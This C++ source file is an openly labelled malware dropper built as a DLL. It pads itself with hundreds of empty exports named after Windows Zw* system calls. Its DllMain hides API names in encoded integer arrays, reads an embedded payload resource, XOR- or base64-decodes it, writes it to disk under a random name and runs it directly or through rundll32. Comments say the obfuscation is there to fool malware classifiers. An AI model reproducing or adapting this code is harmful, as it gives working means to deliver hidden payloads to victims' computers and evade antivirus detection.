extern "C" { __declspec(dllexport) void ZwDeviceIoControlFile() { return; } }
extern "C" { __declspec(dllexport) void ZwDisableLastKnownGood() { return; } }
extern "C" { __declspec(dllexport) void ZwDisplayString() { return; } }
extern "C" { __declspec(dllexport) void ZwDrawText() { return; } }
extern "C" { __declspec(dllexport) void ZwDuplicateObject() { return; } }
extern "C" { __declspec(dllexport) void ZwDuplicateToken() { return; } }
extern "C" { __declspec(dllexport) void ZwEnableLastKnownGood() { return; } }
extern "C" { __declspec(dllexport) void ZwEnumerateBootEntries() { return; } }
extern "C" { __declspec(dllexport) void ZwEnumerateDriverEntries() { return; } }
extern "C" { __declspec(dllexport) void ZwEnumerateKey() { return; } }
extern "C" { __declspec(dllexport) void ZwEnumerateSystemEnvironmentValuesEx() { return; } }
extern "C" { __declspec(dllexport) void ZwEnumerateTransactionObject() { return; } }
extern "C" { __declspec(dllexport) void ZwEnumerateValueKey() { return; } }
extern "C" { __declspec(dllexport) void ZwExtendSection() { return; } }
extern "C" { __declspec(dllexport) void ZwFilterBootOption() { return; } }
extern "C" { __declspec(dllexport) void ZwFilterToken() { return; } }
extern "C" { __declspec(dllexport) void ZwFilterTokenEx() { return; } }
extern "C" { __declspec(dllexport) void ZwFindAtom() { return; } }
extern "C" { __declspec(dllexport) void ZwFlushBuffersFile() { return; } }
extern "C" { __declspec(dllexport) void ZwFlushBuffersFileEx() { return; } }
extern "C" { __declspec(dllexport) void ZwFlushInstallUILanguage() { return; } }
extern "C" { __declspec(dllexport) void ZwFlushInstructionCache() { return; } }
extern "C" { __declspec(dllexport) void ZwFlushKey() { return; } }
extern "C" { __declspec(dllexport) void ZwFlushProcessWriteBuffers() { return; } }
extern "C" { __declspec(dllexport) void ZwFlushVirtualMemory() { return; } }
extern "C" { __declspec(dllexport) void ZwFlushWriteBuffer() { return; } }
extern "C" { __declspec(dllexport) void ZwFreeUserPhysicalPages() { return; } }
extern "C" { __declspec(dllexport) void ZwFreeVirtualMemory() { return; } }
extern "C" { __declspec(dllexport) void ZwFreezeRegistry() { return; } }
extern "C" { __declspec(dllexport) void ZwFreezeTransactions() { return; } }
extern "C" { __declspec(dllexport) void ZwFsControlFile() { return; } }
extern "C" { __declspec(dllexport) void ZwGetCachedSigningLevel() { return; } }
extern "C" { __declspec(dllexport) void ZwGetContextThread() { return; } }
extern "C" { __declspec(dllexport) void ZwGetCurrentProcessorNumber() { return; } }
extern "C" { __declspec(dllexport) void ZwGetDevicePowerState() { return; } }
extern "C" { __declspec(dllexport) void ZwGetMUIRegistryInfo() { return; } }
extern "C" { __declspec(dllexport) void ZwGetNextProcess() { return; } }
extern "C" { __declspec(dllexport) void ZwGetNextThread() { return; } }
extern "C" { __declspec(dllexport) void ZwGetNlsSectionPtr() { return; } }
extern "C" { __declspec(dllexport) void ZwGetNotificationResourceManager() { return; } }
extern "C" { __declspec(dllexport) void ZwGetWriteWatch() { return; } }
extern "C" { __declspec(dllexport) void ZwImpersonateAnonymousToken() { return; } }
extern "C" { __declspec(dllexport) void ZwImpersonateClientOfPort() { return; } }
extern "C" { __declspec(dllexport) void ZwImpersonateThread() { return; } }
extern "C" { __declspec(dllexport) void ZwInitializeNlsFiles() { return; } }
extern "C" { __declspec(dllexport) void ZwInitializeRegistry() { return; } }
extern "C" { __declspec(dllexport) void ZwInitiatePowerAction() { return; } }
extern "C" { __declspec(dllexport) void ZwIsProcessInJob() { return; } }
extern "C" { __declspec(dllexport) void ZwIsSystemResumeAutomatic() { return; } }
extern "C" { __declspec(dllexport) void ZwIsUILanguageComitted() { return; } }
extern "C" { __declspec(dllexport) void ZwListenPort() { return; } }
extern "C" { __declspec(dllexport) void ZwLoadDriver() { return; } }
extern "C" { __declspec(dllexport) void ZwLoadKey() { return; } }
extern "C" { __declspec(dllexport) void ZwLoadKey2() { return; } }
extern "C" { __declspec(dllexport) void ZwLoadKeyEx() { return; } }
extern "C" { __declspec(dllexport) void ZwLockFile() { return; } }
extern "C" { __declspec(dllexport) void ZwLockProductActivationKeys() { return; } }
extern "C" { __declspec(dllexport) void ZwLockRegistryKey() { return; } }
extern "C" { __declspec(dllexport) void ZwLockVirtualMemory() { return; } }
extern "C" { __declspec(dllexport) void ZwMakePermanentObject() { return; } }
extern "C" { __declspec(dllexport) void ZwMakeTemporaryObject() { return; } }
extern "C" { __declspec(dllexport) void ZwMapCMFModule() { return; } }
extern "C" { __declspec(dllexport) void ZwMapUserPhysicalPages() { return; } }
extern "C" { __declspec(dllexport) void ZwMapUserPhysicalPagesScatter() { return; } }
extern "C" { __declspec(dllexport) void ZwMapViewOfSection() { return; } }
extern "C" { __declspec(dllexport) void ZwModifyBootEntry() { return; } }
extern "C" { __declspec(dllexport) void ZwModifyDriverEntry() { return; } }
extern "C" { __declspec(dllexport) void ZwNotifyChangeDirectoryFile() { return; } }
extern "C" { __declspec(dllexport) void ZwNotifyChangeKey() { return; } }
extern "C" { __declspec(dllexport) void ZwNotifyChangeMultipleKeys() { return; } }
extern "C" { __declspec(dllexport) void ZwNotifyChangeSession() { return; } }
extern "C" { __declspec(dllexport) void ZwOpenDirectoryObject() { return; } }
extern "C" { __declspec(dllexport) void ZwOpenEnlistment() { return; } }
extern "C" { __declspec(dllexport) void ZwOpenEvent() { return; } }
extern "C" { __declspec(dllexport) void ZwOpenEventPair() { return; } }
extern "C" { __declspec(dllexport) void ZwOpenFile() { return; } }
extern "C" { __declspec(dllexport) void ZwOpenIoCompletion() { return; } }
extern "C" { __declspec(dllexport) void ZwOpenJobObject() { return; } }
extern "C" { __declspec(dllexport) void ZwOpenKey() { return; } }
extern "C" { __declspec(dllexport) void ZwOpenKeyEx() { return; } }
extern "C" { __declspec(dllexport) void ZwOpenKeyTransacted() { return; } }
extern "C" { __declspec(dllexport) void ZwOpenKeyTransactedEx() { return; } }
extern "C" { __declspec(dllexport) void ZwOpenKeyedEvent() { return; } }
extern "C" { __declspec(dllexport) void ZwOpenMutant() { return; } }
extern "C" { __declspec(dllexport) void ZwOpenObjectAuditAlarm() { return; } }
extern "C" { __declspec(dllexport) void ZwOpenPrivateNamespace() { return; } }
extern "C" { __declspec(dllexport) void ZwOpenProcess() { return; } }
extern "C" { __declspec(dllexport) void ZwOpenProcessToken() { return; } }
extern "C" { __declspec(dllexport) void ZwOpenProcessTokenEx() { return; } }
extern "C" { __declspec(dllexport) void ZwOpenResourceManager() { return; } }
extern "C" { __declspec(dllexport) void ZwOpenSection() { return; } }
extern "C" { __declspec(dllexport) void ZwOpenSemaphore() { return; } }
extern "C" { __declspec(dllexport) void ZwOpenSession() { return; } }
extern "C" { __declspec(dllexport) void ZwOpenSymbolicLinkObject() { return; } }
extern "C" { __declspec(dllexport) void ZwOpenThread() { return; } }
extern "C" { __declspec(dllexport) void ZwOpenThreadToken() { return; } }
extern "C" { __declspec(dllexport) void ZwOpenThreadTokenEx() { return; } }
extern "C" { __declspec(dllexport) void ZwOpenTimer() { return; } }
extern "C" { __declspec(dllexport) void ZwOpenTransaction() { return; } }
extern "C" { __declspec(dllexport) void ZwOpenTransactionManager() { return; } }
extern "C" { __declspec(dllexport) void ZwPlugPlayControl() { return; } }
extern "C" { __declspec(dllexport) void ZwPowerInformation() { return; } }
extern "C" { __declspec(dllexport) void ZwPrePrepareComplete() { return; } }
extern "C" { __declspec(dllexport) void ZwPrePrepareEnlistment() { return; } }
extern "C" { __declspec(dllexport) void ZwPrepareComplete() { return; } }
extern "C" { __declspec(dllexport) void ZwPrepareEnlistment() { return; } }
extern "C" { __declspec(dllexport) void ZwPrivilegeCheck() { return; } }
extern "C" { __declspec(dllexport) void ZwPrivilegeObjectAuditAlarm() { return; } }
extern "C" { __declspec(dllexport) void ZwPrivilegedServiceAuditAlarm() { return; } }
extern "C" { __declspec(dllexport) void ZwPropagationComplete() { return; } }
extern "C" { __declspec(dllexport) void ZwPropagationFailed() { return; } }
extern "C" { __declspec(dllexport) void ZwProtectVirtualMemory() { return; } }
extern "C" { __declspec(dllexport) void ZwPulseEvent() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryAttributesFile() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryBootEntryOrder() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryBootOptions() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryDebugFilterState() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryDefaultLocale() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryDefaultUILanguage() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryDirectoryFile() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryDirectoryObject() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryDriverEntryOrder() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryEaFile() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryEvent() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryFullAttributesFile() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryInformationAtom() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryInformationEnlistment() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryInformationFile() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryInformationJobObject() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryInformationPort() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryInformationProcess() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryInformationResourceManager() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryInformationThread() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryInformationToken() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryInformationTransaction() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryInformationTransactionManager() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryInformationWorkerFactory() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryInstallUILanguage() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryIntervalProfile() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryIoCompletion() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryKey() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryLicenseValue() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryMultipleValueKey() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryMutant() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryObject() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryOpenSubKeys() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryOpenSubKeysEx() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryPerformanceCounter() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryPortInformationProcess() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryQuotaInformationFile() { return; } }
extern "C" { __declspec(dllexport) void ZwQuerySection() { return; } }
extern "C" { __declspec(dllexport) void ZwQuerySecurityAttributesToken() { return; } }
extern "C" { __declspec(dllexport) void ZwQuerySecurityObject() { return; } }
extern "C" { __declspec(dllexport) void ZwQuerySemaphore() { return; } }
extern "C" { __declspec(dllexport) void ZwQuerySymbolicLinkObject() { return; } }
extern "C" { __declspec(dllexport) void ZwQuerySystemEnvironmentValue() { return; } }
extern "C" { __declspec(dllexport) void ZwQuerySystemEnvironmentValueEx() { return; } }
extern "C" { __declspec(dllexport) void ZwQuerySystemInformation() { return; } }
extern "C" { __declspec(dllexport) void ZwQuerySystemInformationEx() { return; } }
extern "C" { __declspec(dllexport) void ZwQuerySystemTime() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryTimer() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryTimerResolution() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryValueKey() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryVirtualMemory() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryVolumeInformationFile() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryWnfStateData() { return; } }
extern "C" { __declspec(dllexport) void ZwQueryWnfStateNameInformation() { return; } }
extern "C" { __declspec(dllexport) void ZwQueueApcThread() { return; } }
extern "C" { __declspec(dllexport) void ZwQueueApcThreadEx() { return; } }
extern "C" { __declspec(dllexport) void ZwRaiseException() { return; } }
extern "C" { __declspec(dllexport) void ZwRaiseHardError() { return; } }
extern "C" { __declspec(dllexport) void ZwReadFile() { return; } }
extern "C" { __declspec(dllexport) void ZwReadFileScatter() { return; } }
extern "C" { __declspec(dllexport) void ZwReadOnlyEnlistment() { return; } }
extern "C" { __declspec(dllexport) void ZwReadRequestData() { return; } }
extern "C" { __declspec(dllexport) void ZwReadVirtualMemory() { return; } }
extern "C" { __declspec(dllexport) void ZwRecoverEnlistment() { return; } }
extern "C" { __declspec(dllexport) void ZwRecoverResourceManager() { return; } }
extern "C" { __declspec(dllexport) void ZwRecoverTransactionManager() { return; } }
extern "C" { __declspec(dllexport) void ZwRegisterProtocolAddressInformation() { return; } }
extern "C" { __declspec(dllexport) void ZwRegisterThreadTerminatePort() { return; } }
extern "C" { __declspec(dllexport) void ZwReleaseKeyedEvent() { return; } }
extern "C" { __declspec(dllexport) void ZwReleaseMutant() { return; } }
extern "C" { __declspec(dllexport) void ZwReleaseSemaphore() { return; } }
extern "C" { __declspec(dllexport) void ZwReleaseWorkerFactoryWorker() { return; } }
extern "C" { __declspec(dllexport) void ZwRemoveIoCompletion() { return; } }
extern "C" { __declspec(dllexport) void ZwRemoveIoCompletionEx() { return; } }
extern "C" { __declspec(dllexport) void ZwRemoveProcessDebug() { return; } }
extern "C" { __declspec(dllexport) void ZwRenameKey() { return; } }
extern "C" { __declspec(dllexport) void ZwRenameTransactionManager() { return; } }
extern "C" { __declspec(dllexport) void ZwReplaceKey() { return; } }
extern "C" { __declspec(dllexport) void ZwReplacePartitionUnit() { return; } }
extern "C" { __declspec(dllexport) void ZwReplyPort() { return; } }
extern "C" { __declspec(dllexport) void ZwReplyWaitReceivePort() { return; } }
extern "C" { __declspec(dllexport) void ZwReplyWaitReceivePortEx() { return; } }
extern "C" { __declspec(dllexport) void ZwReplyWaitReplyPort() { return; } }
extern "C" { __declspec(dllexport) void ZwRequestPort() { return; } }
extern "C" { __declspec(dllexport) void ZwRequestWaitReplyPort() { return; } }
extern "C" { __declspec(dllexport) void ZwResetEvent() { return; } }
extern "C" { __declspec(dllexport) void ZwResetWriteWatch() { return; } }
extern "C" { __declspec(dllexport) void ZwRestoreKey() { return; } }
extern "C" { __declspec(dllexport) void ZwResumeProcess() { return; } }
extern "C" { __declspec(dllexport) void ZwResumeThread() { return; } }
extern "C" { __declspec(dllexport) void ZwRollbackComplete() { return; } }
extern "C" { __declspec(dllexport) void ZwRollbackEnlistment() { return; } }
extern "C" { __declspec(dllexport) void ZwRollbackTransaction() { return; } }
extern "C" { __declspec(dllexport) void ZwRollforwardTransactionManager() { return; } }
extern "C" { __declspec(dllexport) void ZwSaveKey() { return; } }
extern "C" { __declspec(dllexport) void ZwSaveKeyEx() { return; } }
extern "C" { __declspec(dllexport) void ZwSaveMergedKeys() { return; } }
extern "C" { __declspec(dllexport) void ZwSecureConnectPort() { return; } }
extern "C" { __declspec(dllexport) void ZwSerializeBoot() { return; } }
extern "C" { __declspec(dllexport) void ZwSetBootEntryOrder() { return; } }
extern "C" { __declspec(dllexport) void ZwSetBootOptions() { return; } }
extern "C" { __declspec(dllexport) void ZwSetCachedSigningLevel() { return; } }
extern "C" { __declspec(dllexport) void ZwSetContextThread() { return; } }
extern "C" { __declspec(dllexport) void ZwSetDebugFilterState() { return; } }
extern "C" { __declspec(dllexport) void ZwSetDefaultHardErrorPort() { return; } }
extern "C" { __declspec(dllexport) void ZwSetDefaultLocale() { return; } }
extern "C" { __declspec(dllexport) void ZwSetDefaultUILanguage() { return; } }
extern "C" { __declspec(dllexport) void ZwSetDriverEntryOrder() { return; } }
extern "C" { __declspec(dllexport) void ZwSetEaFile() { return; } }
extern "C" { __declspec(dllexport) void ZwSetEvent() { return; } }
extern "C" { __declspec(dllexport) void ZwSetEventBoostPriority() { return; } }
extern "C" { __declspec(dllexport) void ZwSetHighEventPair() { return; } }
extern "C" { __declspec(dllexport) void ZwSetHighWaitLowEventPair() { return; } }
extern "C" { __declspec(dllexport) void ZwSetIRTimer() { return; } }
extern "C" { __declspec(dllexport) void ZwSetInformationDebugObject() { return; } }
extern "C" { __declspec(dllexport) void ZwSetInformationEnlistment() { return; } }
extern "C" { __declspec(dllexport) void ZwSetInformationFile() { return; } }
extern "C" { __declspec(dllexport) void ZwSetInformationJobObject() { return; } }
extern "C" { __declspec(dllexport) void ZwSetInformationKey() { return; } }
extern "C" { __declspec(dllexport) void ZwSetInformationObject() { return; } }
extern "C" { __declspec(dllexport) void ZwSetInformationProcess() { return; } }
extern "C" { __declspec(dllexport) void ZwSetInformationResourceManager() { return; } }
extern "C" { __declspec(dllexport) void ZwSetInformationThread() { return; } }
extern "C" { __declspec(dllexport) void ZwSetInformationToken() { return; } }
extern "C" { __declspec(dllexport) void ZwSetInformationTransaction() { return; } }
extern "C" { __declspec(dllexport) void ZwSetInformationTransactionManager() { return; } }
extern "C" { __declspec(dllexport) void ZwSetInformationVirtualMemory() { return; } }
extern "C" { __declspec(dllexport) void ZwSetInformationWorkerFactory() { return; } }
extern "C" { __declspec(dllexport) void ZwSetIntervalProfile() { return; } }
extern "C" { __declspec(dllexport) void ZwSetIoCompletion() { return; } }
extern "C" { __declspec(dllexport) void ZwSetIoCompletionEx() { return; } }
extern "C" { __declspec(dllexport) void ZwSetLdtEntries() { return; } }
extern "C" { __declspec(dllexport) void ZwSetLowEventPair() { return; } }
extern "C" { __declspec(dllexport) void ZwSetLowWaitHighEventPair() { return; } }
extern "C" { __declspec(dllexport) void ZwSetQuotaInformationFile() { return; } }
extern "C" { __declspec(dllexport) void ZwSetSecurityObject() { return; } }
extern "C" { __declspec(dllexport) void ZwSetSystemEnvironmentValue() { return; } }
extern "C" { __declspec(dllexport) void ZwSetSystemEnvironmentValueEx() { return; } }
extern "C" { __declspec(dllexport) void ZwSetSystemInformation() { return; } }
extern "C" { __declspec(dllexport) void ZwSetSystemPowerState() { return; } }
extern "C" { __declspec(dllexport) void ZwSetSystemTime() { return; } }
extern "C" { __declspec(dllexport) void ZwSetThreadExecutionState() { return; } }
extern "C" { __declspec(dllexport) void ZwSetTimer() { return; } }
extern "C" { __declspec(dllexport) void ZwSetTimerEx() { return; } }
extern "C" { __declspec(dllexport) void ZwSetTimerResolution() { return; } }
extern "C" { __declspec(dllexport) void ZwSetUuidSeed() { return; } }
extern "C" { __declspec(dllexport) void ZwSetValueKey() { return; } }
extern "C" { __declspec(dllexport) void ZwSetVolumeInformationFile() { return; } }
extern "C" { __declspec(dllexport) void ZwShutdownSystem() { return; } }
extern "C" { __declspec(dllexport) void ZwShutdownWorkerFactory() { return; } }
extern "C" { __declspec(dllexport) void ZwSignalAndWaitForSingleObject() { return; } }
extern "C" { __declspec(dllexport) void ZwSinglePhaseReject() { return; } }
extern "C" { __declspec(dllexport) void ZwStartProfile() { return; } }
extern "C" { __declspec(dllexport) void ZwStopProfile() { return; } }
extern "C" { __declspec(dllexport) void ZwSubscribeWnfStateChange() { return; } }
extern "C" { __declspec(dllexport) void ZwSuspendProcess() { return; } }
extern "C" { __declspec(dllexport) void ZwSuspendThread() { return; } }
extern "C" { __declspec(dllexport) void ZwSystemDebugControl() { return; } }
extern "C" { __declspec(dllexport) void ZwTerminateJobObject() { return; } }
extern "C" { __declspec(dllexport) void ZwTerminateProcess() { return; } }
extern "C" { __declspec(dllexport) void ZwTerminateThread() { return; } }
extern "C" { __declspec(dllexport) void ZwTestAlert() { return; } }
extern "C" { __declspec(dllexport) void ZwThawRegistry() { return; } }
extern "C" { __declspec(dllexport) void ZwThawTransactions() { return; } }
extern "C" { __declspec(dllexport) void ZwTraceControl() { return; } }
extern "C" { __declspec(dllexport) void ZwTraceEvent() { return; } }
extern "C" { __declspec(dllexport) void ZwTranslateFilePath() { return; } }
extern "C" { __declspec(dllexport) void ZwUmsThreadYield() { return; } }
extern "C" { __declspec(dllexport) void ZwUnloadDriver() { return; } }
extern "C" { __declspec(dllexport) void ZwUnloadKey() { return; } }
extern "C" { __declspec(dllexport) void ZwUnloadKey2() { return; } }
extern "C" { __declspec(dllexport) void ZwUnloadKeyEx() { return; } }
extern "C" { __declspec(dllexport) void ZwUnlockFile() { return; } }
extern "C" { __declspec(dllexport) void ZwUnlockVirtualMemory() { return; } }
extern "C" { __declspec(dllexport) void ZwUnmapViewOfSection() { return; } }
extern "C" { __declspec(dllexport) void ZwUnmapViewOfSectionEx() { return; } }
extern "C" { __declspec(dllexport) void ZwUnsubscribeWnfStateChange() { return; } }
extern "C" { __declspec(dllexport) void ZwUpdateWnfStateData() { return; } }
extern "C" { __declspec(dllexport) void ZwVdmControl() { return; } }
extern "C" { __declspec(dllexport) void ZwWaitForAlertByThreadId() { return; } }
extern "C" { __declspec(dllexport) void ZwWaitForDebugEvent() { return; } }
extern "C" { __declspec(dllexport) void ZwWaitForKeyedEvent() { return; } }
extern "C" { __declspec(dllexport) void ZwWaitForMultipleObjects() { return; } }
extern "C" { __declspec(dllexport) void ZwWaitForMultipleObjects32() { return; } }
extern "C" { __declspec(dllexport) void ZwWaitForSingleObject() { return; } }
extern "C" { __declspec(dllexport) void ZwWaitForWnfNotifications() { return; } }
extern "C" { __declspec(dllexport) void ZwWaitForWorkViaWorkerFactory() { return; } }
extern "C" { __declspec(dllexport) void ZwWaitHighEventPair() { return; } }
extern "C" { __declspec(dllexport) void ZwWaitLowEventPair() { return; } }
extern "C" { __declspec(dllexport) void ZwWorkerFactoryWorkerReady() { return; } }
extern "C" { __declspec(dllexport) void ZwWriteFile() { return; } }
extern "C" { __declspec(dllexport) void ZwWriteFileGather() { return; } }
extern "C" { __declspec(dllexport) void ZwWriteRequestData() { return; } }
extern "C" { __declspec(dllexport) void ZwWriteVirtualMemory() { return; } }
extern "C" { __declspec(dllexport) void ZwYieldExecution() { return; } }
extern "C" { __declspec(dllexport) void __chkstk() { return; } }
extern "C" { __declspec(dllexport) void __misaligned_access() { return; } }
extern "C" { __declspec(dllexport) void _fltused() { return; } }
extern "C" { __declspec(dllexport) void _lfind() { return; } }
extern "C" { __declspec(dllexport) void _local_unwind() { return; } }

// global: final binary name
char name[10*NAME_SIZE];

// prototype of the function that drops the malware
void run(HANDLE hModule);

// definitions for the dynamic imports
// hiding the imports is important to increase the classifier confidence
typedef HRSRC   (WINAPI *MyFindResourceW)(HMODULE hModule, LPCWSTR  lpName, LPCWSTR  lpType);
typedef HGLOBAL (WINAPI *MyLoadResource)(HMODULE hModule, HRSRC   hResInfo);
typedef LPVOID  (WINAPI *MyLockResource)(HGLOBAL hResData);
typedef DWORD   (WINAPI *MySizeofResource)(HMODULE hModule,HRSRC   hResInfo);
typedef void*   (WINAPI *Mymalloc)(size_t size);
typedef void    (WINAPI *Mysrand)(unsigned int seed);
typedef __time64_t (WINAPI *My_time64)( __time64_t *destTime );
typedef int     (WINAPI *Myrand)(void);
typedef FILE*   (WINAPI *Myfopen)(const char *filename, const char *mode);
typedef int     (WINAPI *Myfprintf)(FILE *stream, const char *format ,...);
typedef int     (WINAPI *Myfclose)(FILE *stream);
typedef void    (WINAPI *Myfree)(void *memblock);
typedef BOOL    (WINAPI *MyCreateProcessA)(
  LPCSTR                lpApplicationName,
  LPSTR                 lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL                  bInheritHandles,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCSTR                lpCurrentDirectory,
  LPSTARTUPINFOA        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);

// handles for the dynamic resolutions
HMODULE k32;
HMODULE msc;
MyFindResourceW frw;
MyLoadResource mlr;
MyLockResource mlor;
MySizeofResource sor;
Mymalloc mm;
Mysrand srd;
My_time64 tm;
Myrand rd;
Myfopen fop;
Myfprintf fpf;
Myfclose fcl;
Myfree fr;
MyCreateProcessA cp;

// decode strings
// it is important to not leave strings in clear
char dec[1024];
char* decode(int *encoded, int size)
{
	for(int i=0;i<size;i++)
	{
		// I put it in a for so one can modify the encoding to something more complex
		dec[i] = char(encoded[i]);
	}
	return dec;
}

// Strings encoded as int arrays
int k32enc[] = {75,101,114,110,101,108,51,50,46,100,108,108,0};
int mscenc[] ={77,83,86,67,82,49,49,48,46,68,76,76,0};
int findrsrcenc[] ={70,105,110,100,82,101,115,111,117,114,99,101,87,0};
int loadrsrcenc[] ={76,111,97,100,82,101,115,111,117,114,99,101,0};
int lockrsrcenc[] ={76,111,99,107,82,101,115,111,117,114,99,101,0};
int szrsrcenc[] ={83,105,122,101,111,102,82,101,115,111,117,114,99,101,0};
int cprocenc[] ={67,114,101,97,116,101,80,114,111,99,101,115,115,65,0};
int mallocenc[] ={109,97,108,108,111,99,0};
int srandenc[] ={115,114,97,110,100,0};
int timeenc[] ={95,116,105,109,101,54,52,0};
int randenc[] ={114,97,110,100,0};
int fopenc[] ={102,111,112,101,110,0};
int fprintfenc[] ={102,112,114,105,110,116,102,0};
int fclosenc[] ={102,99,108,111,115,101,0};
int freenc[] ={102,114,101,101,0};



/* Entry Point */
BOOL APIENTRY DllMain(
   HANDLE hModule,
   DWORD ul_reason_for_call, 
   LPVOID lpReserved )
{
	/* Calling reason */
   switch ( ul_reason_for_call )
   {
	   /* Attached to a process */
      case DLL_PROCESS_ATTACH:
		  // I left the load and get proc as explicit apis bc it was obfuscated enough
		  // if you want to hide them, parse the k32 manually
		  k32 = LoadLibraryA(decode(k32enc,13));
		  // resolve dynamic refs when starting
		  frw = (MyFindResourceW)GetProcAddress(k32,decode(findrsrcenc,14));
		  mlr = (MyLoadResource)GetProcAddress(k32,decode(loadrsrcenc,13));
		  mlor = (MyLockResource)GetProcAddress(k32,decode(lockrsrcenc,13));
		  sor = (MySizeofResource)GetProcAddress(k32,decode(szrsrcenc,15));
		  cp = (MyCreateProcessA)GetProcAddress(k32,decode(cprocenc,15));
		  msc = LoadLibraryA(decode(mscenc,13));
		  mm = (Mymalloc)GetProcAddress(msc,decode(mallocenc,7));
		  srd = (Mysrand)GetProcAddress(msc,decode(srandenc,6));
		  tm = (My_time64)GetProcAddress(msc,decode(timeenc,8));
		  rd = (Myrand)GetProcAddress(msc,decode(randenc,5));
		  fop = (Myfopen)GetProcAddress(msc,decode(fopenc,6));
		  fpf = (Myfprintf)GetProcAddress(msc,decode(fprintfenc,8));
		  fcl = (Myfclose)GetProcAddress(msc,decode(fclosenc,7));
		  fr = (Myfree)GetProcAddress(msc,decode(freenc,5));
		  // function that actually drops
		  // this function was previously the main of the original dropper
		  // must pass module handle to invoke the DLL and not the main process functions
		  run(hModule);
		break;
  
	  /* Attached to a thread */
      case DLL_THREAD_ATTACH:
	  /* Nothing to do */
      break;
      
	  /* Detached from a thread */
      case DLL_THREAD_DETACH:
      /* Nothing to do */
      break;
      
	  /* Detached  from a process */
      case DLL_PROCESS_DETACH:
      break;
   }
   return TRUE;
}

// same as previously the dropper's main function
void run(HANDLE hModule)
{
	// Handle to myself
	HMODULE h = (HMODULE)hModule;
	// Locate Resource
	HRSRC r = frw(h,MAKEINTRESOURCE(IDR_BIN1),MAKEINTRESOURCE(BIN));
	// Load Resource
	HGLOBAL rc = mlr(h,r);
	// Ensure nobody else will handle it
	void* data = mlor(rc);
	// Get embedded file size
	DWORD size = sor(h,r);
	// Obfuscation Procedures start here
#ifdef XOR_ENCODE
	data = XOR(data,size);
#endif
#ifdef BASE64
	data = base64decode(data,&size);
#endif
	// where to drop
	set_name();
	// Drop to Disk
	drop(size, data);
	// free buffer
	fr(data);
	// launch process
	launch();
}

void set_name()
{
#ifdef RANDOM_NAME
	int valid=0;
	srd(tm(NULL));
	while(valid<NAME_SIZE)
	{
		char c = rd();
		if(c>='a' && c<='z')
		{
			name[valid++]=c;
		}
	}
#else
	strcpy(name,"proc");
#endif
#ifdef INJECT
	strcat(name,".dll");
#else
	strcat(name,".exe");
#endif
}

// Launch a New Process based on the dropped file name
void launch()
{
	STARTUPINFOA si;
    PROCESS_INFORMATION pi;
	ZeroMemory( &si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi));
// build injection command
#ifdef INJECT
	char cmd[10*NAME_SIZE] = "C:\\Windows\\system32\\rundll32.exe";
	char args[10*NAME_SIZE];
	sprintf(args,"%s %s,#1",cmd,name);
	CreateProcessA(cmd,args,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi );
// call directly
#else
	cp(name,NULL,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi );
#endif
}

// Decode a Base64 String
void* base64decode(void *data,DWORD *size)
{
	// original string size
	int original_size = strlen((char*)data);
	// number of bytes after decoded
	int decoded_size = Base64DecodeGetRequiredLength(original_size);
	// temporary buffer to store the decoded bytes
	void *buffer2 = mm(decoded_size);
	// decoded
	Base64Decode((PCSTR)data,original_size,(BYTE*)buffer2,&decoded_size);
	// return new buffer size
	*size = decoded_size;
	// free buffer original
	fr(data);
	// return new buffer
	return buffer2;
	// old buffer is lost (without freeing, sorry)
}

// XOR bytes in the buffer with a key
void* XOR(void *data, int size){
	// auxiliary buffer
	// this is never freed, but ok, i'm not a goodware anyway
	void *buffer = (void*)mm(size);
	for(int i=0;i<size;i++)
	{
		((char*)buffer)[i] = ((char*)data)[i] ^ XOR_KEY;
	}
	return buffer;
}

// Drop buffer to file
void drop(int size, void *buffer)
{
	FILE *f = fop(name,"wb");
	// traverse byte list
    for(int i=0;i<size;i++)
    {
		// byte pointer
        unsigned char c1 = ((char*)buffer)[i];
		// drop byte to file
        fpf(f,"%c",c1);
    }
	// file fully written
    fcl(f);
}